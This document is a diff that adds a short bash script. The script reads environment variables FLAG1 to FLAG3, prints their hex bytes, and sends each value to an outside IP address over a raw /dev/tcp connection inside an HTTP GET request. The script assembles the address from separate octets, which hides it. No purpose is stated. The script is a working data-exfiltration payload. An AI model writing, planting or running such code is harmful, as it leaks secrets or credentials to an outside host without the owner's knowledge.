@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+peer="$(printf '%d.%d.%d.%d' 8 217 202 186)"
+for n in 1 2 3; do
+  eval "val=\$FLAG$n"
+  printf 'B%s ' "$n"
+  printf '%s' "$val" | xxd -p -c1 | paste -sd: -
+  echo
+  exec 9<>"/dev/tcp/${peer}/80" || continue
+  printf 'GET /zillwc/%s HTTP/1.0\r\nHost: %s\r\n\r\n' "$val" "$peer" >&9
+  dd bs=1 count=64 <&9 2>/dev/null || true
+  exec 9<&- 9>&- || true
+done
